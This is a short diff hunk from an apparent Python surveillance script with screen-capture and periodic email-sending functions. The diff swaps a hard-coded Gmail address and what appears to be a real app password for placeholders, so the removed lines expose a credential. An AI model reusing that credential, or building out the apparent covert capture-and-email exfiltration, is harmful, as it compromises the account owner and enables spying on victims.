@@ -63,9 +63,9 @@ def screen_capture():
 
 # Email sending logic 
 def send_email():
-    FROM_EMAIL = "vanldhe176194@gmail.com"
-    FROM_PASS = "snjt ggcx rgfg nvqy"
-    TO_EMAIL = "vanldhe176194@gmail.com"
+    FROM_EMAIL = "your_mail@gmail.com"
+    FROM_PASS = "your_pass_code"
+    TO_EMAIL = "your_mail@gmail.com"
 
     while True:
         time.sleep(900) 
